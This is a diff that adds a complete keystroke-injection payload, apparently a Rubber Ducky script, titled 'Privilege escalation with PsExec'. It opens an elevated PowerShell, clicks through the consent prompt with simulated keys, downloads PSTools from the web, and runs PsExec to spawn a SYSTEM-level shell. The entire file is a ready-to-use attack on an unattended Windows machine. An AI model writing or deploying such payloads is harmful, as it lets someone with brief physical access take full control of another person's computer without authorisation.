@@ -1,0 +1,22 @@
+REM Author: Fastiraz
+REM Description: Privilege escalation with PsExec.
+REM Version:	1.0
+REM Category:	Privilege Escalation
+DELAY 750
+WINDOWS d
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 750
+LEFTARROW
+DELAY 1100
+ENTER
+DELAY 1200
+ALT y
+DELAY 1300
+GUI UP
+DELAY 1400
+STRING Invoke-WebRequest -Uri "https://download.sysinternals.com/files/PSTools.zip" -OutFile .\PSTools.zip;Expand-Archive -Path .\PSTools.zip -DestinationPath .;.\PsExec.exe -accepteula -s powershell.exe
+ENTER
